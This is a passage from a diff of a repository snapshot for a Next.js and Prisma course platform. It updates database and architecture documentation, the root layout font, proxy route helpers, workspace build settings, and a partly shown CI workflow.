+ 22: | ------------- | -------- | ------------- |
+ 23: | id            | String   | PK (CUID)     |
+ 24: | email         | String   | Unique        |
+ 25: | name          | String?  | Optional      |
+ 26: | emailVerified | Boolean  | Default false |
+ 27: | image         | String?  | Optional      |
+ 28: | createdAt     | DateTime | Auto          |
+ 29: | updatedAt     | DateTime | Auto          |
+ 30: 
+ 31: Relations: `sessions[]`, `accounts[]`, `userRoles[]`
+ 32: 
+ 33: #### Session
+ 34: 
+ 35: | Field     | Type     | Notes     |
+ 36: | --------- | -------- | --------- |
+ 37: | id        | String   | PK        |
+ 38: | token     | String   | Unique    |
+ 39: | userId    | String   | FK → User |
+ 40: | expiresAt | DateTime | —         |
+ 41: | ipAddress | String?  | Optional  |
+ 42: | userAgent | String?  | Optional  |
+ 43: | createdAt | DateTime | Auto      |
+ 44: | updatedAt | DateTime | Auto      |
+ 45: 
+ 46: Relations: `user`
+ 47: 
+ 48: #### Account
+ 49: 
+ 50: | Field                 | Type      | Notes     |
+ 51: | --------------------- | --------- | --------- |
+ 52: | id                    | String    | PK        |
+ 53: | accountId             | String    | —         |
+ 54: | providerId            | String    | —         |
+ 55: | userId                | String    | FK → User |
+ 56: | accessToken           | String?   | Optional  |
+ 57: | refreshToken          | String?   | Optional  |
+ 58: | idToken               | String?   | Optional  |
+ 59: | accessTokenExpiresAt  | DateTime? | Optional  |
+ 60: | refreshTokenExpiresAt | DateTime? | Optional  |
+ 61: | scope                 | String?   | Optional  |
+ 62: | password              | String?   | Hashed    |
+ 63: | createdAt             | DateTime  | Auto      |
+ 64: | updatedAt             | DateTime  | Auto      |
+ 65: 
+ 66: Relations: `user`
+ 67: 
+ 68: #### Verification
+ 69: 
+ 70: | Field      | Type     | Notes |
+ 71: | ---------- | -------- | ----- |
+ 72: | id         | String   | PK    |
+ 73: | identifier | String   | —     |
+ 74: | value      | String   | —     |
+ 75: | expiresAt  | DateTime | —     |
+ 76: | createdAt  | DateTime | Auto  |
+ 77: | updatedAt  | DateTime | Auto  |
+ 78: 
+ 79: ### Authorization Models (RBAC)
+ 80: 
+ 81: #### Role
+ 82: 
+ 83: | Field       | Type     | Notes     |
+ 84: | ----------- | -------- | --------- |
+ 85: | id          | String   | PK (CUID) |
+ 86: | name        | String   | Unique    |
+ 87: | description | String?  | Optional  |
+ 88: | createdAt   | DateTime | Auto      |
+ 89: | updatedAt   | DateTime | Auto      |
+ 90: 
+ 91: Relations: `userRoles[]`, `rolePermissions[]`
+ 92: 
+ 93: #### Permission
+ 94: 
+ 95: | Field       | Type     | Notes         |
+ 96: | ----------- | -------- | ------------- |
+ 97: | id          | String   | PK (CUID)     |
+ 98: | name        | String   | Unique        |
+ 99: | resource    | String   | Resource type |
+100: | action      | String   | Action type   |
+101: | description | String?  | Optional      |
+102: | createdAt   | DateTime | Auto          |
+103: | updatedAt   | DateTime | Auto          |
+104: 
+105: Relations: `rolePermissions[]`
+106: 
+107: Unique constraint: `[resource, action]`
+108: 
+109: #### UserRole
+110: 
+111: | Field     | Type     | Notes     |
+112: | --------- | -------- | --------- |
+113: | id        | String   | PK (CUID) |
+114: | userId    | String   | FK → User |
+115: | roleId    | String   | FK → Role |
+116: | createdAt | DateTime | Auto      |
+117: 
+118: Relations: `user`, `role`
+119: 
+120: Unique constraint: `[userId, roleId]`
+121: 
+122: #### RolePermission
+123: 
+124: | Field        | Type     | Notes           |
+125: | ------------ | -------- | --------------- |
+126: | id           | String   | PK (CUID)       |
+127: | roleId       | String   | FK → Role       |
+128: | permissionId | String   | FK → Permission |
+129: | createdAt    | DateTime | Auto            |
+130: 
+131: Relations: `role`, `permission`
+132: 
+133: Unique constraint: `[roleId, permissionId]`
+134: 
+135: ## Commands
+136: 
+137: ```bash
+138: pnpm prisma migrate dev     # create + apply migration
+139: pnpm prisma generate        # generate Prisma Client
+140: pnpm prisma studio          # open Prisma Studio
+141: pnpm prisma db push         # push schema changes (dev only)
+142: ```
+143: 
+144: Never modify production DBs manually. Always version-control migrations.
+145: 
+146: ## Naming
+147: 
+148: - Models: singular PascalCase.
+149: - Fields: camelCase.
+150: - Relations: explicit names where needed.
+151: 
+152: ## Authorization Flow
+153: 
+154: ```
+155: User → UserRole → Role → RolePermission → Permission
+156: ```
+157: 
+158: Example permissions:
+159: 
+160: - `users:read` - Read user data
+161: - `users:write` - Create/update users
+162: - `users:delete` - Delete users
+163: - `sessions:revoke:any` - Revoke any user's session (admin)
+164: 
+165: ## Performance
+166: 
+167: Add indexes only when justified. Avoid unnecessary joins. Paginate large results. Select only required fields.
+168: 
+169: Existing indexes:
+170: 
+171: - `Session.userId`
+172: - `Account.userId`
+173: - `Verification.identifier`
+174: - `UserRole.userId`, `UserRole.roleId`
+175: - `RolePermission.roleId`, `RolePermission.permissionId`
+176: 
+177: ## Security
+178: 
+179: - Never expose password hashes, secrets, or internal identifiers without authorization
+180: - Validate input before any DB operation
+181: - All authorization checks happen server-side in services
+182: - Session ownership must be verified before revocation
+183: - Never trust client-provided user IDs, roles, or permissions
 `````
 
 ## File: docs/Development/Git.md
@@ -28833,96 +28162,133 @@ tsconfig.json
 
 ## File: docs/Architecture.md
 `````markdown
- 1: # Architecture
- 2: 
- 3: ## Layers
- 4: 
- 5: ```
- 6: UI → Actions/Routes → Services → Repositories → Database (Prisma + PostgreSQL)
- 7: ```
- 8: 
- 9: ## Responsibilities
-10: 
-11: | Layer            | Does                                                     | Must NOT                                 |
-12: | ---------------- | -------------------------------------------------------- | ---------------------------------------- |
-13: | **UI**           | Render, user interaction                                 | Business logic, direct DB access         |
-14: | **Actions**      | Auth, input validation (Zod), call services              | Business logic, direct repo access       |
-15: | **Services**     | Business rules, multi-repo workflows, complex validation | Know about HTTP, depend on UI frameworks |
-16: | **Repositories** | Queries, CRUD, data mapping                              | Business logic, business rules           |
-17: | **Database**     | Persistence                                              | —                                        |
-18: 
-19: ## Principles
-20: 
-21: 1. **Separation of concerns** — business logic only in services; data access only in repos.
-22: 2. **Dependency direction** — flows downward only. Repositories never import services.
-23: 3. **Server Components first** — use Client Components only for state, effects, event handlers, browser APIs.
-24: 4. **Thin routes** — pages compose components and call actions/services; no logic in pages.
-25: 5. **Reusable abstractions** — never introduce a second pattern when one exists.
-26: 
-27: ## When to Add Each Layer
-28: 
-29: - **Repository:** every DB table.
-30: - **Service:** any business rule, multi-step workflow, or operation touching multiple repos.
-31: - **Action:** every user-initiated mutation and any client-component data fetch.
-32: 
-33: ## Type Safety
-34: 
-35: - Never `any`.
-36: - Export reusable types close to the feature.
-37: - Zod for runtime validation; infer TS types from schemas.
-38: 
-39: ---
-40: 
-41: ## Concurrency & Transaction Patterns
-42: 
-43: ### 1. Parent Course Row Locking (`SELECT ... FOR UPDATE`)
-44: All curriculum mutations and course lifecycle transitions are serialized through an explicit parent course row lock (`lockCourseForUpdate(tx, courseId)`):
-45: 
-46: ```
-47: BEGIN TRANSACTION
-48:   ↓
-49: SELECT * FROM course WHERE id = :courseId FOR UPDATE
-50:   ↓ (Status must remain DRAFT for curriculum mutations)
-51: Execute mutation / Verify state
-52:   ↓
-53: COMMIT
-54: ```
-55: 
-56: This synchronization boundary guarantees that:
-57: - Concurrent curriculum mutations cannot occur while a course is being published or archived.
-58: - A course cannot be published concurrently with a module/lesson creation, reorder, or deletion.
-59: - Cascading `deleteCourse` is safely serialized against concurrent curriculum mutations.
-60: 
-61: ### 2. Atomic Curriculum Reordering
-62: Reordering of modules and lessons guarantees exact sequential ordering `0..N-1` with no duplicates or gaps:
-63: - **In-Transaction Verification:** The current sibling list is fetched inside the transaction after acquiring the lock. The provided ID array must be an exact permutation of existing siblings (no foreign, duplicate, or missing IDs).
-64: - **Two-Phase Update:** When unique constraints on `[parentId, orderIndex]` exist, reordering assigns temporary negative offsets (`-1 - i`) in phase 1, followed by final contiguous zero-based indexes (`0..N-1`) in phase 2, preventing transient unique key violations.
-65: 
-66: ### 3. Concurrency-Safe Retries (`P2002`)
-67: - For operations susceptible to concurrent insert collisions (slug generation, sequential `orderIndex` assignment), retries wrap the entire `prisma.$transaction(...)` boundary.
-68: - Each retry attempt begins a completely fresh transaction after full rollback of the preceding attempt, ensuring consistent reads of the latest committed state.
-69: 
-70: ---
-71: 
-72: ## Course Catalog & Learning Player Architecture
-73: 
-74: ### 1. Catalog & Overview Routes
-75: - **`/courses`**: Server Component reading validated query params (`search`, `category`, `level`, `sort`, `page`). Queries published courses via bounded pagination (`limit=12`) with batch enrollment decoration. Zero client-side fetching libraries or external search engines.
-76: - **`/courses/[slug]`**: Server Component presenting course metadata, instructor credentials, and full curriculum outline (`CourseSyllabus`). Enforces public visibility for published courses, requiring instructor author or admin authorization for draft/archived previews.
-77: - **`/courses/[slug]/learn`**: Deterministic server-side redirect entry. Routes enrolled students to their next incomplete lesson (or lesson 1 if 100% completed), or first free preview lesson for anonymous/unenrolled visitors.
-78: 
-79: ### 2. Student Learning Player (`/courses/[slug]/lessons/[lessonId]`)
-80: - **Security & Authorization Invariants:**
-81:   - Mandatory cross-course boundary check: verifies `lesson.module.course.id === course.id`. Cross-course lesson requests strictly return `NotFoundError` (preventing ID enumeration).
-82:   - Enrollment & Preview Gate: Unenrolled visitors can only access lessons where `isFreePreview === true`. Non-preview lesson requests by unenrolled users safely redirect to `/courses/[slug]?enrolled=false`.
-83:   - Archived Course Protection: Enrolled students cannot access lessons of archived courses.
-84: - **Player Component Layout:**
-85:   - `PlayerHeader`: Breadcrumbs, back-to-overview link, mobile curriculum drawer toggle.
-86:   - `PlayerSidebar`: Desktop sticky sidebar and mobile drawer with course progress bar, module accordions, completion checkmarks, locked indicators, and active lesson indicator.
-87:   - `PlayerVideo`: Secure sandboxed 16:9 iframe embed supporting YouTube, Vimeo, Loom.
-88:   - `PlayerContent`: Sanitized lesson markdown reader using typography tokens.
-89:   - `PlayerResources`: Validated downloadable and reference links (http/https only).
-90:   - `PlayerFooter`: Persistent previous/next lesson navigation and `LessonCompletionButton`.
+  1: # Architecture
+  2: 
+  3: ## Layers
+  4: 
+  5: ```
+  6: UI → Actions/Routes → Services → Repositories → Database (Prisma + PostgreSQL)
+  7: ```
+  8: 
+  9: ## Responsibilities
+ 10: 
+ 11: | Layer            | Does                                                     | Must NOT                                 |
+ 12: | ---------------- | -------------------------------------------------------- | ---------------------------------------- |
+ 13: | **UI**           | Render, user interaction                                 | Business logic, direct DB access         |
+ 14: | **Actions**      | Auth, input validation (Zod), call services              | Business logic, direct repo access       |
+ 15: | **Services**     | Business rules, multi-repo workflows, complex validation | Know about HTTP, depend on UI frameworks |
+ 16: | **Repositories** | Queries, CRUD, data mapping                              | Business logic, business rules           |
+ 17: | **Database**     | Persistence                                              | —                                        |
+ 18: 
+ 19: ## Domain Services & Repositories Registry
+ 20: 
+ 21: | Domain Area | Service Layer (`@/services/*`) | Concrete Repositories (`@/repositories/*`) | Primary Responsibilities |
+ 22: | ----------- | ------------------------------ | ------------------------------------------ | ------------------------ |
+ 23: | **Authentication & Users** | `auth.ts`, `session.ts`, `user.ts` | `user.ts`, `session.ts` | Credentials, session management, user lifecycle |
+ 24: | **RBAC Authorization** | `authorization.ts` | `role.ts`, `permission.ts`, `user-role.ts`, `role-permission.ts` | Role checks (`admin`, `instructor`, `student`), permissions |
+ 25: | **Profile Management** | `profile.ts` | `user.ts` | Self-ownership profile updates and avatar metadata |
+ 26: | **Courses & Publishing** | `course.ts` | `course.ts` | Course CRUD, slug generation, publishing state machines |
+ 27: | **Curriculum Structure** | `curriculum.ts` | `module.ts`, `lesson.ts` | Modules, lessons, atomic two-phase reordering |
+ 28: | **Lesson Content & Media** | `lesson-content.ts` | `lesson-content.ts` | Markdown compilation, HTML sanitization, video normalization |
+ 29: | **Enrollment** | `enrollment.ts` | `enrollment.ts` | Student course enrollment, batch status decoration |
+ 30: | **Progress & Completion** | `progress.ts` | `lesson-progress.ts`, `enrollment.ts` | Atomic progress tracking, percent calculation, next lesson |
+ 31: 
+ 32: ---
+ 33: 
+ 34: ## 4-Tier Authorization Doctrine
+ 35: 
+ 36: Every server operation enforces security in depth across four distinct layers:
+ 37: 
+ 38: ```
+ 39: [Tier 1: Authentication Guard]
+ 40:   ↓ (Assert valid Better Auth session; anonymous users denied on protected routes)
+ 41: [Tier 2: Role Authorization]
+ 42:   ↓ (Assert required roles: "instructor" or "admin" for authoring operations)
+ 43: [Tier 3: Resource Ownership]
+ 44:   ↓ (Assert resource ownership: course.instructorId === session.userId or sessionUserId === targetUserId)
+ 45: [Tier 4: Lifecycle State Guard]
+ 46:   ↓ (Assert state invariants: DRAFT for curriculum edits; PUBLISHED for enrollment; ARCHIVED locked)
+ 47: ```
+ 48: 
+ 49: 1. **Tier 1 (Authentication):** Enforced via `requireAuth()` in Server Actions and route handlers. Anonymous users cannot mutate data.
+ 50: 2. **Tier 2 (Role Authorization):** Enforced via `requireRole(...)` or `requireAnyRole(...)`. Students cannot access instructor workspaces or authoring endpoints.
+ 51: 3. **Tier 3 (Resource Ownership / IDOR Defense):** Services strictly verify that callers own the resource they are mutating. Instructors cannot modify courses, modules, lessons, or content belonging to other instructors. Students cannot mutate or query other students' progress.
+ 52: 4. **Tier 4 (Lifecycle State Constraints):** Courses must be in `DRAFT` status for curriculum mutations. Courses cannot be published without at least 1 module and 1 lesson. `ARCHIVED` courses are locked against modifications and denied to regular students.
+ 53: 
+ 54: ---
+ 55: 
+ 56: ## Principles
+ 57: 
+ 58: 1. **Separation of concerns** — business logic only in services; data access only in repos.
+ 59: 2. **Dependency direction** — flows downward only. Repositories never import services.
+ 60: 3. **Server Components first** — use Client Components only for state, effects, event handlers, browser APIs.
+ 61: 4. **Thin routes** — pages compose components and call actions/services; no logic in pages.
+ 62: 5. **Reusable abstractions** — never introduce a second pattern when one exists.
+ 63: 
+ 64: ## When to Add Each Layer
+ 65: 
+ 66: - **Repository:** every DB table.
+ 67: - **Service:** any business rule, multi-step workflow, or operation touching multiple repos.
+ 68: - **Action:** every user-initiated mutation and any client-component data fetch.
+ 69: 
+ 70: ## Type Safety
+ 71: 
+ 72: - Never `any`.
+ 73: - Export reusable types close to the feature.
+ 74: - Zod for runtime validation; infer TS types from schemas.
+ 75: 
+ 76: ---
+ 77: 
+ 78: ## Concurrency & Transaction Patterns
+ 79: 
+ 80: ### 1. Parent Course Row Locking (`SELECT ... FOR UPDATE`)
+ 81: All curriculum mutations and course lifecycle transitions are serialized through an explicit parent course row lock (`lockCourseForUpdate(tx, courseId)`):
+ 82: 
+ 83: ```
+ 84: BEGIN TRANSACTION
+ 85:   ↓
+ 86: SELECT * FROM course WHERE id = :courseId FOR UPDATE
+ 87:   ↓ (Status must remain DRAFT for curriculum mutations)
+ 88: Execute mutation / Verify state
+ 89:   ↓
+ 90: COMMIT
+ 91: ```
+ 92: 
+ 93: This synchronization boundary guarantees that:
+ 94: - Concurrent curriculum mutations cannot occur while a course is being published or archived.
+ 95: - A course cannot be published concurrently with a module/lesson creation, reorder, or deletion.
+ 96: - Cascading `deleteCourse` is safely serialized against concurrent curriculum mutations.
+ 97: 
+ 98: ### 2. Atomic Curriculum Reordering
+ 99: Reordering of modules and lessons guarantees exact sequential ordering `0..N-1` with no duplicates or gaps:
+100: - **In-Transaction Verification:** The current sibling list is fetched inside the transaction after acquiring the lock. The provided ID array must be an exact permutation of existing siblings (no foreign, duplicate, or missing IDs).
+101: - **Two-Phase Update:** When unique constraints on `[parentId, orderIndex]` exist, reordering assigns temporary negative offsets (`-1 - i`) in phase 1, followed by final contiguous zero-based indexes (`0..N-1`) in phase 2, preventing transient unique key violations.
+102: 
+103: ### 3. Concurrency-Safe Retries (`P2002`)
+104: - For operations susceptible to concurrent insert collisions (slug generation, sequential `orderIndex` assignment), retries wrap the entire `prisma.$transaction(...)` boundary.
+105: - Each retry attempt begins a completely fresh transaction after full rollback of the preceding attempt, ensuring consistent reads of the latest committed state.
+106: 
+107: ---
+108: 
+109: ## Course Catalog & Learning Player Architecture
+110: 
+111: ### 1. Catalog & Overview Routes
+112: - **`/courses`**: Server Component reading validated query params (`search`, `category`, `level`, `sort`, `page`). Queries published courses via bounded pagination (`limit=12`) with batch enrollment decoration. Zero client-side fetching libraries or external search engines.
+113: - **`/courses/[slug]`**: Server Component presenting course metadata, instructor credentials, and full curriculum outline (`CourseSyllabus`). Enforces public visibility for published courses, requiring instructor author or admin authorization for draft/archived previews.
+114: - **`/courses/[slug]/learn`**: Deterministic server-side redirect entry. Routes enrolled students to their next incomplete lesson (or lesson 1 if 100% completed), or first free preview lesson for anonymous/unenrolled visitors.
+115: 
+116: ### 2. Student Learning Player (`/courses/[slug]/lessons/[lessonId]`)
+117: - **Security & Authorization Invariants:**
+118:   - Mandatory cross-course boundary check: verifies `lesson.module.course.id === course.id`. Cross-course lesson requests strictly return `NotFoundError` (preventing ID enumeration).
+119:   - Enrollment & Preview Gate: Unenrolled visitors can only access lessons where `isFreePreview === true`. Non-preview lesson requests by unenrolled users safely redirect to `/courses/[slug]?enrolled=false`.
+120:   - Archived Course Protection: Enrolled students cannot access lessons of archived courses.
+121: - **Player Component Layout:**
+122:   - `PlayerHeader`: Breadcrumbs, back-to-overview link, mobile curriculum drawer toggle.
+123:   - `PlayerSidebar`: Desktop sticky sidebar and mobile drawer with course progress bar, module accordions, completion checkmarks, locked indicators, and active lesson indicator.
+124:   - `PlayerVideo`: Secure sandboxed 16:9 iframe embed supporting YouTube, Vimeo, Loom.
+125:   - `PlayerContent`: Sanitized lesson markdown reader using typography tokens.
+126:   - `PlayerResources`: Validated downloadable and reference links (http/https only).
+127:   - `PlayerFooter`: Persistent previous/next lesson navigation and `LessonCompletionButton`.
 `````
 
 ## File: docs/Tech Stack.md
@@ -28969,44 +28335,42 @@ tsconfig.json
 ## File: src/app/layout.tsx
 `````typescript
  1: import type { Metadata } from "next";
- 2: import { Manrope } from "next/font/google";
+ 2: import { Geist } from "next/font/google";
  3: import { GooeyToaster } from "@/components/ui/goey-toaster";
  4: import { ThemeProvider } from "@/providers/theme-provider";
  5: import "./globals.css";
- 6: const manrope = Manrope({
- 7:   variable: "--font-sans",
- 8:   subsets: ["latin"],
- 9: });
-10: export const metadata: Metadata = {
-11:   title: "Next.js Project",
-12:   description:
-13:     "Maintainable, production-grade software with clean architecture",
-14: };
-15: export default function RootLayout({
-16:   children,
-17: }: Readonly<{
-18:   children: React.ReactNode;
-19: }>) {
-20:   return (
-21:     <html
-22:       lang="en"
-23:       suppressHydrationWarning
-24:       className={`${manrope.variable} h-full antialiased`}
-25:     >
-26:       <body className="flex min-h-full flex-col">
-27:         <ThemeProvider
-28:           attribute="class"
-29:           defaultTheme="system"
-30:           enableSystem
-31:           disableTransitionOnChange
-32:         >
-33:           {children}
-34:           <GooeyToaster />
-35:         </ThemeProvider>
-36:       </body>
-37:     </html>
-38:   );
-39: }
+ 6: import { cn } from "@/lib/utils";
+ 7: const geist = Geist({ subsets: ["latin"], variable: "--font-sans" });
+ 8: export const metadata: Metadata = {
+ 9:   title: "Next.js Project",
+10:   description:
+11:     "Maintainable, production-grade software with clean architecture",
+12: };
+13: export default function RootLayout({
+14:   children,
+15: }: Readonly<{
+16:   children: React.ReactNode;
+17: }>) {
+18:   return (
+19:     <html
+20:       lang="en"
+21:       suppressHydrationWarning
+22:       className={cn("h-full", "antialiased", "font-sans", geist.variable)}
+23:     >
+24:       <body className="flex min-h-full flex-col">
+25:         <ThemeProvider
+26:           attribute="class"
+27:           defaultTheme="system"
+28:           enableSystem
+29:           disableTransitionOnChange
+30:         >
+31:           {children}
+32:           <GooeyToaster />
+33:         </ThemeProvider>
+34:       </body>
+35:     </html>
+36:   );
+37: }
 `````
 
 ## File: src/services/auth.ts
@@ -29114,26 +28478,6 @@ tsconfig.json
 101:   }
 102:   return userRepository.updateUser(id, data);
 103: }
-`````
-
-## File: .env.example
-`````
- 1: # Database (Neon PostgreSQL)
- 2: DATABASE_URL="postgresql://user:password@host/database?sslmode=require"
- 3: DIRECT_URL="postgresql://user:password@host/database?sslmode=require"
- 4: 
- 5: # Better Auth
- 6: BETTER_AUTH_SECRET="<generate with: openssl rand -base64 32>"
- 7: BETTER_AUTH_URL="http://localhost:3000"
- 8: 
- 9: # Sentry (Error Monitoring & Performance Tracking)
-10: # Client & Server DSN: https://<key>@<org>.ingest.sentry.io/<project>
-11: NEXT_PUBLIC_SENTRY_DSN=""
-12: SENTRY_DSN=""
-13: # Required for uploading source maps during production build / CI
-14: SENTRY_ORG=""
-15: SENTRY_PROJECT=""
-16: SENTRY_AUTH_TOKEN=""
 `````
 
 ## File: jest.config.ts
@@ -29373,6 +28717,20 @@ tsconfig.json
 30: });
 `````
 
+## File: pnpm-workspace.yaml
+`````yaml
+ 1: allowBuilds:
+ 2:   "@parcel/watcher": false
+ 3:   "@prisma/engines": false
+ 4:   esbuild: false
+ 5:   prisma: false
+ 6: onlyBuiltDependencies:
+ 7:   - "@prisma/engines"
+ 8:   - "@sentry/cli"
+ 9:   - esbuild
+10:   - prisma
+`````
+
 ## File: proxy.ts
 `````typescript
  1: import { type NextRequest, NextResponse } from "next/server";
@@ -29380,12 +28738,12 @@ tsconfig.json
  3: const authRoutes = ["/sign-in", "/sign-up"];
  4: function isPublicRoute(pathname: string): boolean {
  5:   return publicRoutes.some(
- 6:     (route) => pathname === route || pathname.startsWith(route + "/"),
+ 6:     (route) => pathname === route || pathname.startsWith(`${route}/`),
  7:   );
  8: }
  9: function isAuthRoute(pathname: string): boolean {
 10:   return authRoutes.some(
-11:     (route) => pathname === route || pathname.startsWith(route + "/"),
+11:     (route) => pathname === route || pathname.startsWith(`${route}/`),
 12:   );
 13: }
 14: function hasSessionCookie(request: NextRequest): boolean {
@@ -29424,193 +28782,6 @@ tsconfig.json
 47: export const config = {
 48:   matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
 49: };
-`````
-
-## File: docs/API/Database.md
-`````markdown
-  1: # Database
-  2: 
-  3: PostgreSQL on Neon. Prisma ORM. Repositories are the only layer that talks to Prisma.
-  4: 
-  5: ## Principles
-  6: 
-  7: Simple, normalized, scalable, easy to maintain. **No business logic in the database.**
-  8: 
-  9: ## Access Flow
- 10: 
- 11: ```
- 12: UI → Actions → Services → Repositories → Prisma → PostgreSQL
- 13: ```
- 14: 
- 15: ## Schema
- 16: 
- 17: ### Authentication Models (Better Auth)
- 18: 
- 19: #### User
- 20: 
- 21: | Field         | Type     | Notes         |
- 22: | ------------- | -------- | ------------- |
- 23: | id            | String   | PK (CUID)     |
- 24: | email         | String   | Unique        |
- 25: | name          | String?  | Optional      |
- 26: | emailVerified | Boolean  | Default false |
- 27: | image         | String?  | Optional      |
- 28: | createdAt     | DateTime | Auto          |
- 29: | updatedAt     | DateTime | Auto          |
- 30: 
- 31: Relations: `sessions[]`, `accounts[]`, `userRoles[]`
- 32: 
- 33: #### Session
- 34: 
- 35: | Field     | Type     | Notes     |
- 36: | --------- | -------- | --------- |
- 37: | id        | String   | PK        |
- 38: | token     | String   | Unique    |
- 39: | userId    | String   | FK → User |
- 40: | expiresAt | DateTime | —         |
- 41: | ipAddress | String?  | Optional  |
- 42: | userAgent | String?  | Optional  |
- 43: | createdAt | DateTime | Auto      |
- 44: | updatedAt | DateTime | Auto      |
- 45: 
- 46: Relations: `user`
- 47: 
- 48: #### Account
- 49: 
- 50: | Field                 | Type      | Notes     |
- 51: | --------------------- | --------- | --------- |
- 52: | id                    | String    | PK        |
- 53: | accountId             | String    | —         |
- 54: | providerId            | String    | —         |
- 55: | userId                | String    | FK → User |
- 56: | accessToken           | String?   | Optional  |
- 57: | refreshToken          | String?   | Optional  |
- 58: | idToken               | String?   | Optional  |
- 59: | accessTokenExpiresAt  | DateTime? | Optional  |
- 60: | refreshTokenExpiresAt | DateTime? | Optional  |
- 61: | scope                 | String?   | Optional  |
- 62: | password              | String?   | Hashed    |
- 63: | createdAt             | DateTime  | Auto      |
- 64: | updatedAt             | DateTime  | Auto      |
- 65: 
- 66: Relations: `user`
- 67: 
- 68: #### Verification
- 69: 
- 70: | Field      | Type     | Notes |
- 71: | ---------- | -------- | ----- |
- 72: | id         | String   | PK    |
- 73: | identifier | String   | —     |
- 74: | value      | String   | —     |
- 75: | expiresAt  | DateTime | —     |
- 76: | createdAt  | DateTime | Auto  |
- 77: | updatedAt  | DateTime | Auto  |
- 78: 
- 79: ### Authorization Models (RBAC)
- 80: 
- 81: #### Role
- 82: 
- 83: | Field       | Type     | Notes     |
- 84: | ----------- | -------- | --------- |
- 85: | id          | String   | PK (CUID) |
- 86: | name        | String   | Unique    |
- 87: | description | String?  | Optional  |
- 88: | createdAt   | DateTime | Auto      |
- 89: | updatedAt   | DateTime | Auto      |
- 90: 
- 91: Relations: `userRoles[]`, `rolePermissions[]`
- 92: 
- 93: #### Permission
- 94: 
- 95: | Field       | Type     | Notes         |
- 96: | ----------- | -------- | ------------- |
- 97: | id          | String   | PK (CUID)     |
- 98: | name        | String   | Unique        |
- 99: | resource    | String   | Resource type |
-100: | action      | String   | Action type   |
-101: | description | String?  | Optional      |
-102: | createdAt   | DateTime | Auto          |
-103: | updatedAt   | DateTime | Auto          |
-104: 
-105: Relations: `rolePermissions[]`
-106: 
-107: Unique constraint: `[resource, action]`
-108: 
-109: #### UserRole
-110: 
-111: | Field     | Type     | Notes     |
-112: | --------- | -------- | --------- |
-113: | id        | String   | PK (CUID) |
-114: | userId    | String   | FK → User |
-115: | roleId    | String   | FK → Role |
-116: | createdAt | DateTime | Auto      |
-117: 
-118: Relations: `user`, `role`
-119: 
-120: Unique constraint: `[userId, roleId]`
-121: 
-122: #### RolePermission
-123: 
-124: | Field        | Type     | Notes           |
-125: | ------------ | -------- | --------------- |
-126: | id           | String   | PK (CUID)       |
-127: | roleId       | String   | FK → Role       |
-128: | permissionId | String   | FK → Permission |
-129: | createdAt    | DateTime | Auto            |
-130: 
-131: Relations: `role`, `permission`
-132: 
-133: Unique constraint: `[roleId, permissionId]`
-134: 
-135: ## Commands
-136: 
-137: ```bash
-138: pnpm prisma migrate dev     # create + apply migration
-139: pnpm prisma generate        # generate Prisma Client
-140: pnpm prisma studio          # open Prisma Studio
-141: pnpm prisma db push         # push schema changes (dev only)
-142: ```
-143: 
-144: Never modify production DBs manually. Always version-control migrations.
-145: 
-146: ## Naming
-147: 
-148: - Models: singular PascalCase.
-149: - Fields: camelCase.
-150: - Relations: explicit names where needed.
-151: 
-152: ## Authorization Flow
-153: 
-154: ```
-155: User → UserRole → Role → RolePermission → Permission
-156: ```
-157: 
-158: Example permissions:
-159: 
-160: - `users:read` - Read user data
-161: - `users:write` - Create/update users
-162: - `users:delete` - Delete users
-163: - `sessions:revoke:any` - Revoke any user's session (admin)
-164: 
-165: ## Performance
-166: 
-167: Add indexes only when justified. Avoid unnecessary joins. Paginate large results. Select only required fields.
-168: 
-169: Existing indexes:
-170: 
-171: - `Session.userId`
-172: - `Account.userId`
-173: - `Verification.identifier`
-174: - `UserRole.userId`, `UserRole.roleId`
-175: - `RolePermission.roleId`, `RolePermission.permissionId`
-176: 
-177: ## Security
-178: 
-179: - Never expose password hashes, secrets, or internal identifiers without authorization
-180: - Validate input before any DB operation
-181: - All authorization checks happen server-side in services
-182: - Session ownership must be verified before revocation
-183: - Never trust client-provided user IDs, roles, or permissions
 `````
 
 ## File: docs/meta/Start Here.md
@@ -29676,18 +28847,83 @@ tsconfig.json
 59: Update docs on every significant change. ADRs before implementation when possible. Docs always reflect current state.
 `````
 
-## File: pnpm-workspace.yaml
+## File: .github/workflows/ci.yml
 `````yaml
- 1: allowBuilds:
- 2:   "@parcel/watcher": false
- 3:   "@prisma/engines": false
- 4:   esbuild: false
- 5:   prisma: false
- 6: onlyBuiltDependencies:
- 7:   - "@prisma/engines"
- 8:   - "@sentry/cli"
- 9:   - esbuild
-10:   - prisma
+ 1: name: CI
+ 2: on:
+ 3:   push:
+ 4:     branches: [master, dev]
+ 5:   pull_request:
+ 6:     branches: [master, dev]
+ 7: env:
+ 8:   DATABASE_URL: "postgresql://placeholder:placeholder@localhost:5432/placeholder"
+ 9:   DIRECT_URL: "postgresql://placeholder:placeholder@localhost:5432/placeholder"
+10:   BETTER_AUTH_SECRET: "placeholderplaceholderplaceholderplaceholder"
+11:   BETTER_AUTH_URL: "http://localhost:3000"
+12: jobs:
+13:   quality:
+14:     name: Quality Checks
+15:     runs-on: ubuntu-latest
+16:     steps:
+17:       - name: Checkout
+18:         uses: actions/checkout@v4
+19:       - name: Setup pnpm
+20:         uses: pnpm/action-setup@v4
+21:       - name: Setup Node.js
+22:         uses: actions/setup-node@v4
+23:         with:
+24:           node-version: 22
+25:           cache: pnpm
+26:       - name: Install dependencies
+27:         run: pnpm install --frozen-lockfile
+28:       - name: Generate Prisma client
+29:         run: pnpm prisma:generate
+30:       - name: TypeScript check
+31:         run: pnpm tsc --noEmit
+32:       - name: ESLint check
+33:         run: pnpm lint
+34:       - name: Dead code check
+35:         run: pnpm knip
+36:   test:
+37:     name: Tests
+38:     runs-on: ubuntu-latest
+39:     steps:
+40:       - name: Checkout
+41:         uses: actions/checkout@v4
+42:       - name: Setup pnpm
+43:         uses: pnpm/action-setup@v4
+44:       - name: Setup Node.js
+45:         uses: actions/setup-node@v4
+46:         with:
+47:           node-version: 22
+48:           cache: pnpm
+49:       - name: Install dependencies
+50:         run: pnpm install --frozen-lockfile
+51:       - name: Generate Prisma client
+52:         run: pnpm prisma:generate
+53:       - name: Run tests
+54:         run: pnpm test
+55:   build:
+56:     name: Build
+57:     runs-on: ubuntu-latest
+58:     steps:
+59:       - name: Checkout
+60:         uses: actions/checkout@v4
+61:       - name: Setup pnpm
+62:         uses: pnpm/action-setup@v4
+63:       - name: Setup Node.js
+64:         uses: actions/setup-node@v4
+65:         with:
